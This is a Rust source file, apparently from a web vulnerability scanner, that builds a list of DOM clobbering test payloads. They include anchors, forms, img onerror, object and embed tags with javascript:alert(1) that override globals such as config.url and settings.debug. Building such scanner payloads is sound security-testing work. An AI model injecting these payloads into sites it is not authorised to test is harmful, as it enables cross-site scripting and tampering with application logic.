/// DOM Clobbering payloads that exploit named property access on DOM elements
/// to override global variables and object properties used by application logic.
pub(crate) fn get_dom_clobbering_payloads() -> Vec<String> {
    let templates = [
        // Anchor id/name chain to clobber properties like x.y
        "<a id={ID} name={ID} href=\"javascript:alert(1)\">",
        // Form/input name override to clobber form.action or config vars
        "<form id={ID} class={CLASS}><input name=\"action\" value=\"javascript:alert(1)\"></form>",
        // Anchor chain for nested property access (e.g. config.url)
        "<a id=config class={CLASS}></a><a id=config name=url href=\"javascript:alert(1)\">",
        // Image with id to clobber src-based lookups
        "<img id={ID} name={ID} src=x onerror=alert(1) class={CLASS}>",
        // Object tag clobbering
        "<object id={ID} class={CLASS} data=\"javascript:alert(1)\">",
        // Embed clobbering
        "<embed id={ID} class={CLASS} src=\"javascript:alert(1)\">",
        // Anchor clobbering targeting settings/options patterns
        "<a id=settings class={CLASS}></a><a id=settings name=debug href=\"javascript:alert(1)\">",
        // Form with output to clobber result properties
        "<form id={ID} class={CLASS}><output name=innerHTML>clobbered</output></form>",
    ];

    templates
        .iter()
        .map(|t| crate::scanning::markers::fill_markers(t))
        .collect()
}

#[cfg(test)]
mod tests;
